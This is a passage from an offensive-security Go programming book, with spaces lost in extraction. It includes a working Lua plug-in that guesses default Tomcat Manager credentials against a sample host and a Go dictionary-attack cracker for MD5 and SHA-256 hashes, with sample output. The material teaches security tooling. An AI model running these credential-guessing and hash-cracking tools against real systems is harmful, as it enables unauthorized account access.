andhttp.head()withouthavingtocreateaninstanceoftypehttpin
Lua.
AsyoumayhavenotedintheSetField()calls,thethird
parameteristhedestinationfunctionthat’llhandletheLua
calls.Inthiscase,thoseareyourget()andhead()functionsyou
previouslyimplemented.Thesearewrappedinacallto
l.NewFunction(),whichacceptsafunctionofformfunc(*LState)int,
whichishowyoudefinedyourget()andhead()functions.They
returna*lua.LFunction.Thismightbealittleoverwhelming,
sincewe’veintroducedalotofdatatypesandyou’reprobably
unfamiliarwithgopher-lua.Justunderstandthatthisfunctionis
registeringtheglobalnamespaceandfunctionnamesand
creatingmappingsbetweenthosefunctionnamesandyourGo
functions.
WritingYourMainFunction
Lastly,you’llneedtocreateyourmain()function,whichwill
coordinatethisregistrationprocessandexecutetheplug-in
(Listing10-7).
❶constPluginsDir="../../plugins"
funcmain(){
var(
l*lua.LState
files[]os.FileInfo
errerror
fstring
)
❷l=lua.NewState()
deferl.Close()
❸register(l)
❹iffiles,err=ioutil.ReadDir(PluginsDir);err!=nil{
log.Fatalln(err)
}
❺foridx:=rangefiles{
fmt.Println("Foundplugin:"+files[idx].Name())
f=fmt.Sprintf("%s/%s",PluginsDir,files[idx].Name())
❻iferr:=l.DoFile(f);err!=nil{
log.Fatalln(err)
}
}
}
Listing10-7:RegisteringandcallingLuaplug-ins(/ch-10/lua-
core/cmd/scanner/main.go)
Asyoudidforyourmain()functionintheGoexample,
you’llhardcodethedirectorylocationfromwhichyou’llload
yourplug-ins❶.Inyourmain()function,youissueacallto
lua.NewState()❷tocreateanew*lua.LStateinstance.The
lua.NewState()instanceisthekeyitemyou’llneedtosetupyour
LuaVM,registeryourfunctionsandtypes,andexecute
arbitraryLuascripts.Youthenpassthatpointertotheregister()
functionyoucreatedearlier❸,whichregistersyourcustom
httpnamespaceandfunctionsonthestate.Youreadthe
contentsofyourplug-insdirectory❹,loopingthrougheach
fileinthedirectory❺.Foreachfile,youcalll.DoFile(f)❻,
wherefistheabsolutepathtothefile.Thiscallexecutesthe
contentsofthefilewithintheLuastateonwhichyou
registeredyourcustomtypesandfunctions.Basically,DoFile()
isgopher-lua’swayofallowingyoutoexecuteentirefilesasif
theywerestand-aloneLuascripts.
CreatingYourPlug-inScript
Nowlet’stakealookatyourTomcatplug-inscript,writtenin
Lua(Listing10-8).
usernames={"admin","manager","tomcat"}
passwords={"admin","manager","tomcat","password"}
status,basic,err=http.head("10.0.1.20",8080,"/manager/html")❶
iferr~=""then
print("[!]Error:"..err)
return
end
ifstatus~=401ornotbasicthen
print("[!]Error:EndpointdoesnotrequireBasicAuth.Exiting.")
return
end
print("[+]EndpointrequiresBasicAuth.Proceedingwithpasswordguessing")
fori,usernameinipairs(usernames)do
forj,passwordinipairs(passwords)do
status,basic,err=http.get("10.0.1.20",8080,username,password,
"/manager/html")❷
ifstatus==200then
print("[+]Foundcreds-"..username..":"..password)
return
end
end
end
Listing10-8:ALuaplug-inforTomcatpasswordguessing(/ch-10/lua-
core/plugins/tomcat.lua)
Don’tworrytoomuchaboutthevulnerability-checking
logic.It’sessentiallythesameasthelogicyoucreatedinthe
Goversionofthisplug-in;itperformsbasicpassword
guessingagainsttheTomcatManagerportalafterit
fingerprintstheapplicationbyusingaHEADrequest.We’ve
highlightedthetwomostinterestingitems.
Thefirstisacalltohttp.head("10.0.1.20",8080,"/manager/html")❶.
Basedoffyourglobalandfieldregistrationsonthestate
metatable,youcanissueacalltoafunctionnamedhttp.head()
withoutreceivingaLuaerror.Additionally,you’resupplying
thecallwiththethreeparametersyourhead()functionexpected
toreadfromtheLStateinstance.TheLuacallisexpectingthree
returnvalues,whichalignwiththenumbersandtypesyou
pushedontotheLStatebeforeyouexitedtheGofunction.
Theseconditemisyourcalltohttp.get()❷,whichissimilar
tothehttp.head()functioncall.Theonlyrealdifferenceisthat
youarepassingusernameandpasswordparameterstothe
http.get()function.IfyoureferbacktotheGoimplementationof
yourget()function,you’llseethatwe’rereadingthesetwo
additionalstringsfromtheLStateinstance.
TestingtheLuaPlug-in
Thisexampleisn’tperfectandcouldbenefitfromadditional
designconsiderations.Butaswithmostadversarialtools,the
mostimportantthingisthatitworksandsolvesaproblem.
Runningyourcodeprovesthatitdoes,indeed,workas
expected:
$gorunmain.go
Foundplugin:tomcat.lua
[+]EndpointrequiresBasicAuth.Proceedingwithpasswordguessing
[+]Foundcreds-tomcat:tomcat
Nowthatyouhaveabasicworkingexample,weencourage
youtoimprovethedesignbyimplementinguser-definedtypes
sothatyouaren’tpassinglengthylistsofargumentsand
parameterstoandfromfunctions.Withthis,you’lllikelyneed
toexploreregisteringinstancemethodsonyourstruct,whether
forsettingandgettingvaluesinLuaorforcallingmethodson
aspecificallyimplementedinstance.Asyouworkthrough
this,you’llnoticethatyourcodewillgetsignificantlymore
complex,sinceyou’llbewrappingalotofyourGo
functionalityinaLua-friendlymanner.
SUMMARY
Aswithmanydesigndecisions,therearemultiplewaystoskin
acat.Whetheryou’reusingGo’snativeplug-insystemoran
alternativelanguagelikeLua,youmustconsidertrade-offs.
Butregardlessofyourapproach,youcaneasilyextendGoto
makerichsecurityframeworks,particularlysincetheaddition
ofitsnativeplug-insystem.
Inthenextchapter,you’lltackletherichtopicof
cryptography.We’lldemonstratevariousimplementationsand
usecases,andthenbuildanRC2symmetric-keybrute-forcer.
11
IMPLEMENTINGANDATTACKING
CRYPTOGRAPHY
Aconversationaboutsecurityisn’tcompletewithout
exploringcryptography.Whenorganizationsuse
cryptographicpractices,theycanhelpconservetheintegrity,
confidentiality,andauthenticityoftheirinformationand
systemsalike.Asatooldeveloper,you’dlikelyneedto
implementcryptographicfeatures,perhapsforSSL/TLS
communications,mutualauthentication,symmetric-key
cryptography,orpasswordhashing.Butdevelopersoften
implementcryptographicfunctionsinsecurely,whichmeans
theoffensive-mindedcanexploittheseweaknessesto
compromisesensitive,valuabledata,suchassocialsecurityor
creditcardnumbers.
Thischapterdemonstratesvariousimplementationsof
cryptographyinGoanddiscussescommonweaknessesyou
canexploit.Althoughweprovideintroductoryinformationfor
thedifferentcryptographicfunctionsandcodeblocks,we’re
notattemptingtoexplorethenuancesofcryptographic
algorithmsortheirmathematicalfoundations.That,frankly,is
farbeyondourinterestin(orknowledgeof)cryptography.As
we’vestatedbefore,don’tattemptanythinginthischapter
againstresourcesorassetswithoutexplicitpermissionfrom
theowner.We’reincludingthesediscussionsforlearning
purposes,nottoassistinillegalactivities.
REVIEWINGBASIC
CRYPTOGRAPHYCONCEPTS
BeforeweexplorecryptoinGo,let’sdiscussafewbasic
cryptographyconcepts.We’llmakethisshorttokeepyou
fromfallingintoadeepsleep.
First,encryption(forthepurposesofmaintaining
confidentiality)isjustoneofthetasksofcryptography.
Encryption,generallyspeaking,isatwo-wayfunctionwith
whichyoucanscrambledataandsubsequentlyunscrambleit
toretrievetheinitialinput.Theprocessofencryptingdata
rendersitmeaninglessuntilit’sbeendecrypted.
Bothencryptionanddecryptioninvolvepassingthedata
andanaccompanyingkeyintoacryptographicfunction.The
functionoutputseithertheencrypteddata(calledciphertext)
ortheoriginal,readabledata(calledcleartext).Various
algorithmsexisttodothis.Symmetricalgorithmsusethesame
keyduringtheencryptionanddecryptionprocesses,whereas
asymmetricalgorithmsusedifferentkeysforencryptionand
decryption.Youmightuseencryptiontoprotectdataintransit
ortostoresensitiveinformation,suchascreditcardnumbers,
todecryptlater,perhapsforconvenienceduringafuture
purchaseorforfraudmonitoring.
Ontheotherhand,hashingisaone-wayprocessfor
mathematicallyscramblingdata.Youcanpasssensitive
informationintoahashingfunctiontoproduceafixed-length
output.Whenyou’reworkingwithstrongalgorithms,suchas
thoseintheSHA-2family,theprobabilitythatdifferentinputs
producethesameoutputisextremelylow.Thatis,thereisa
lowlikelihoodofacollision.Becausethey’renonreversible,
hashesarecommonlyusedasanalternativetostoringcleartext
passwordsinadatabaseortoperformintegritycheckingto
determinewhetherdatahasbeenchanged.Ifyouneedto
obscureorrandomizetheoutputsfortwoidenticalinputs,you
useasalt,whichisarandomvalueusedtodifferentiatetwo
identicalinputsduringthehashingprocess.Saltsarecommon
forpasswordstoragebecausetheyallowmultipleuserswho
coincidentallyuseidenticalpasswordstostillhavedifferent
hashvalues.
Cryptographyalsoprovidesameansforauthenticating
messages.Amessageauthenticationcode(MAC)istheoutput
producedfromaspecialone-waycryptographicfunction.This
functionconsumesthedataitself,asecretkey,andan
initializationvector,andproducesanoutputunlikelytohavea
collision.Thesenderofamessageperformsthefunctionto
generateaMACandthenincludestheMACaspartofthe
message.ThereceiverlocallycalculatestheMACand
comparesittotheMACtheyreceived.Amatchindicatesthat
thesenderhasthecorrectsecretkey(thatis,thatthesenderis
authentic)andthatthemessagewasnotchanged(theintegrity
hasbeenmaintained).
There!Nowyoushouldknowenoughaboutcryptography
tounderstandthecontentsofthischapter.Wherenecessary,
we’lldiscussmorespecificsrelevanttothegiventopic.Let’s
startbylookingatGo’sstandardcryptolibrary.
UNDERSTANDINGTHESTANDARD
CRYPTOLIBRARY
ThebeautifulthingaboutimplementingcryptoinGoisthat
themajorityofcryptographicfeaturesyou’lllikelyusearepart
ofthestandardlibrary.Whereasotherlanguagescommonly
relyonOpenSSLorotherthird-partylibraries,Go’scrypto
featuresarepartoftheofficialrepositories.Thismakes
implementingcryptorelativelystraightforward,asyouwon’t
havetoinstallclumsydependenciesthat’llpolluteyour
developmentenvironment.Therearetwoseparaterepositories.
Theself-containedcryptopackagecontainsavarietyof
subpackagesusedforthemostcommoncryptographictasks
andalgorithms.Forexample,youcouldusetheaes,des,andrc4
subpackagesforimplementingsymmetric-keyalgorithms;the
dsaandrsasubpackagesforasymmetricencryption;andthemd5,
sha1,sha256,andsha512subpackagesforhashing.Thisisnotan
exhaustivelist;additionalsubpackagesexistforothercrypto
functions,aswell.
Inadditiontothestandardcryptopackage,Gohasan
official,extendedpackagethatcontainsavarietyof
supplementarycryptofunctionality:golang.org/x/crypto.The
functionalitywithinincludesadditionalhashingalgorithms,
encryptionciphers,andutilities.Forexample,thepackage
containsabcryptsubpackageforbcrypthashing(abetter,more
securealternativeforhashingpasswordsandsensitivedata),
acme/autocertforgeneratinglegitimatecertificates,andSSH
subpackagestofacilitatecommunicationsovertheSSH
protocol.
Theonlyrealdifferencebetweenthebuilt-incryptoand
supplementarygolang.org/x/cryptopackagesisthatthecrypto
packageadherestomorestringentcompatibilityrequirements.
Also,ifyouwishtouseanyofthegolang.org/x/crypto
subpackages,you’llfirstneedtoinstallthepackageby
enteringthefollowing:
$goget-ugolang.org/x/crypto/bcrypt
Foracompletelistingofallthefunctionalityand
subpackageswithintheofficialGocryptopackages,checkout
theofficialdocumentationathttps://golang.org/pkg/crypto/
andhttps://godoc.org/golang.org/x/crypto/.
Thenextsectionsdelveintovariouscrypto
implementations.You’llseehowtouseGo’scrypto
functionalitytodosomenefariousthings,suchascrack
passwordhashes,decryptsensitivedatabyusingastatickey,
andbrute-forceweakencryptionciphers.You’llalsousethe
functionalitytocreatetoolsthatuseTLStoprotectyourin-
transitcommunications,checktheintegrityandauthenticityof
data,andperformmutualauthentication.
EXPLORINGHASHING
Hashing,aswementionedpreviously,isaone-wayfunction
usedtoproduceafixed-length,probabilisticallyuniqueoutput
basedonavariable-lengthinput.Youcan’treversethishash
valuetoretrievetheoriginalinputsource.Hashesareoften
usedtostoreinformationwhoseoriginal,cleartextsource
won’tbeneededforfutureprocessingortotracktheintegrity
ofdata.Forexample,it’sbadpracticeandgenerally
unnecessarytostorethecleartextversionofthepassword;
instead,you’dstorethehash(salted,ideally,toensure
randomnessbetweenduplicatevalues).
TodemonstratehashinginGo,we’lllookattwoexamples.
ThefirstattemptstocrackagivenMD5orSHA-512hashby
usinganofflinedictionaryattack.Thesecondexample
demonstratesanimplementationofbcrypt.Asmentioned
previously,bcryptisamoresecurealgorithmforhashing
sensitivedatasuchaspasswords.Thealgorithmalsocontains
afeaturethatreducesitsspeed,makingithardertocrack
passwords.
CrackinganMD5orSHA-256Hash
Listing11-1showsthehash-crackingcode.(Allthecode
listingsattherootlocationof/existundertheprovidedgithub
repohttps://github.com/blackhat-go/bhg/.)Sincehashesaren’t
directlyreversible,thecodeinsteadtriestoguessthecleartext
valueofthehashbygeneratingitsownhashesofcommon
words,takenfromawordlist,andthencomparingthe
resultinghashvaluewiththehashyouhaveinhand.Ifthetwo
hashesmatch,you’velikelyguessedthecleartextvalue.
❶varmd5hash="77f62e3524cd583d698d51fa24fdff4f"
varsha256hash=
"95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced"
funcmain(){
f,err:=os.Open("wordlist.txt")❷
iferr!=nil{
log.Fatalln(err)
}
deferf.Close()
❸scanner:=bufio.NewScanner(f)
forscanner.Scan(){
password:=scanner.Text()
hash:=fmt.Sprintf("%x",md5.Sum([]byte(password))❹)
❺ifhash==md5hash{
fmt.Printf("[+]Passwordfound(MD5):%s\n",password)
}
hash=fmt.Sprintf("%x",sha256.Sum256([]byte(password))❻)
❼ifhash==sha256hash{
fmt.Printf("[+]Passwordfound(SHA-256):%s\n",password)
}
}
iferr:=scanner.Err();err!=nil{
log.Fatalln(err)
}
}
Listing11-1:CrackingMD5andSHA-256hashes(/ch-11/hashes/main.go)
Youstartbydefiningtwovariables❶thatholdthetarget
hashvalues.OneisanMD5hash,andtheotherisaSHA-256.
Imaginethatyouacquiredthesetwohashesaspartofpost-
exploitationandyou’retryingtodeterminetheinputs(the
cleartextpasswords)thatproducedthemafterbeingrun
throughthehashingalgorithm.Youcanoftendeterminethe
algorithmbyinspectingthelengthofthehashitself.Whenyou
findahashthatmatchesthetarget,you’llknowyouhavethe
correctinput.
Thelistofinputsyou’lltryexistsinadictionaryfileyou’ll
havecreatedearlier.Alternatively,aGooglesearchcanhelp
youfinddictionaryfilesforcommonlyusedpasswords.To
checktheMD5hash,youopenthedictionaryfile❷andread
it,linebyline,bycreatingabufio.Scanneronthefiledescriptor
❸.Eachlineconsistsofasinglepasswordvaluethatyouwish
tocheck.Youpassthecurrentpasswordvalueintoafunction
namedmd5.Sum(input[]byte)❹.ThisfunctionproducestheMD5
hashvalueasrawbytes,soyouusethefmt.Sprintf()function
withtheformatstring%xtoconvertittoahexadecimalstring.
Afterall,yourmd5hashvariableconsistsofahexadecimalstring
representationofthetargethash.Convertingyourvalue
ensuresthatyoucanthencomparethetargetandcalculated
hashvalues❺.Ifthesehashesmatch,theprogramdisplaysa
successmessagetostdout.
Youperformasimilarprocesstocalculateandcompare
SHA-256hashes.Theimplementationisfairlysimilartothe
MD5code.Theonlyrealdifferenceisthatthesha256package
containsadditionalfunctionstocalculatevariousSHAhash
lengths.Ratherthancallingsha256.Sum()(afunctionthatdoesn’t
exist),youinsteadcallsha256.Sum256(input[]byte)❻toforcethe
hashtobecalculatedusingtheSHA-256algorithm.Muchas
youdidintheMD5example,youconvertyourrawbytestoa
hexstringandcomparetheSHA-256hashestoseewhether
youhaveamatch❼.
Implementingbcrypt
Thenextexampleshowshowtousebcrypttoencryptand
authenticatepasswords.UnlikeSHAandMD5,bcryptwas
designedforpasswordhashing,makingitabetteroptionfor
applicationdesignersthantheSHAorMD5families.It
includesasaltbydefault,aswellasacostfactorthatmakes
runningthealgorithmmoreresource-intensive.Thiscost
factorcontrolsthenumberofiterationsoftheinternalcrypto
functions,increasingthetimeandeffortneededtocracka
passwordhash.Althoughthepasswordcanstillbecracked
usingadictionaryorbrute-forceattack,thecost(intime)
increasessignificantly,discouragingcrackingactivitiesduring
time-sensitivepost-exploitation.It’salsopossibletoincrease
thecostovertimetocountertheadvancementofcomputing
power.Thismakesitadaptivetofuturecrackingattacks.
Listing11-2createsabcrypthashandthenvalidates
whetheracleartextpasswordmatchesagivenbcrypthash.
import(
"log"
"os"
❶"golang.org/x/crypto/bcrypt"
)
❷varstoredHash=
"$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu"